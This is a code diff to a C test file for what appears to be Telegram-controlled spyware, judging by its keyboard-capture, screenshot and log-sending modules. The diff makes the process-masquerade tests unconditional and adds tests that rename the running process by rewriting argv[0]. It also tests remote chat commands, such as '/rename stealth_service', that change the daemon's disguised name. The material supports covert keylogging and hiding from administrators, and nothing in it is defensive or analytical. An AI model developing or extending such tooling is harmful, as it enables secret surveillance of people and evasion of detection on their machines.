@@ -26,10 +26,12 @@
 #include "keyboard/keyboard_output.h"
 #include "logging/log_sender.h"
 #include "logging/logging.h"
+#include "runtime/runtime.h"
 #include "screenshot/screenshot.h"
 #include "screenshot/screenshot_encoder.h"
 #include "screenshot/screenshot_output.h"
 #include "telegram/telegram.h"
+#include "telegram/telegram_listener.h"
 #include "telegram/telegram_platform.h"
 
 #include <stdio.h>
@@ -812,7 +814,6 @@ int main(void) {
   unsetenv("C2T_KEYBOARD_FLUSH_MS");
   c2t_config_load_environment();
 
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
   /* Process name configuration tests */
   unsetenv("C2T_DAEMON_NAME");
   unsetenv("C2T_SUPERVISOR_NAME");
@@ -839,10 +840,59 @@ int main(void) {
       strcmp(c2t_config_get()->supervisor_name, "clisup") != 0)
     return fail("process name cli arguments parsing");
 
+  c2t_config_set_daemon_name("custom_setter_daemon");
+  if (strcmp(c2t_config_get()->daemon_name, "custom_setter_daemon") != 0)
+    return fail("c2t_config_set_daemon_name");
+
+  char fake_argv0[64] = "initial_fake_process";
+  char *fake_argv[] = {fake_argv0, nullptr};
+  c2t_runtime_set_process_name("renamed_proc", 1, fake_argv);
+  if (strcmp(fake_argv0, "renamed_proc") != 0)
+    return fail("c2t_runtime_set_process_name with argv failed");
+  c2t_runtime_set_process_name("second_rename", 0, nullptr);
+  if (strcmp(fake_argv0, "second_rename") != 0)
+    return fail("c2t_runtime_set_process_name with cached argv failed");
+
+  /* Test Telegram listener process renaming commands */
+  const char *target_chat = c2t_config_get()->telegram_chat_id;
+  if (target_chat && *target_chat) {
+    telegram_incoming_update_t update_query = {
+        .update_id = 1001,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/process_name",
+    };
+    c2t_telegram_listener_handle_update(&update_query);
+    if (!body_contains("Process%20Name", sizeof("Process%20Name") - 1))
+      return fail("/process_name query failed");
+
+    telegram_incoming_update_t update_set = {
+        .update_id = 1002,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/process_name my_tele_daemon",
+    };
+    c2t_telegram_listener_handle_update(&update_set);
+    if (strcmp(c2t_config_get()->daemon_name, "my_tele_daemon") != 0 ||
+        !body_contains("Process%20Name%20Updated", sizeof("Process%20Name%20Updated") - 1) ||
+        !body_contains("my_tele_daemon", 14))
+      return fail("/process_name command set failed");
+
+    telegram_incoming_update_t update_rename = {
+        .update_id = 1003,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/rename stealth_service",
+    };
+    c2t_telegram_listener_handle_update(&update_rename);
+    if (strcmp(c2t_config_get()->daemon_name, "stealth_service") != 0 ||
+        !body_contains("stealth_service", 15))
+      return fail("/rename alias command failed");
+  }
+
   unsetenv("C2T_DAEMON_NAME");
   unsetenv("C2T_SUPERVISOR_NAME");
   c2t_config_load_environment();
-#endif
 
   /* Keyboard output worker and batch flush test */
   int kb_posts = http_post_calls;
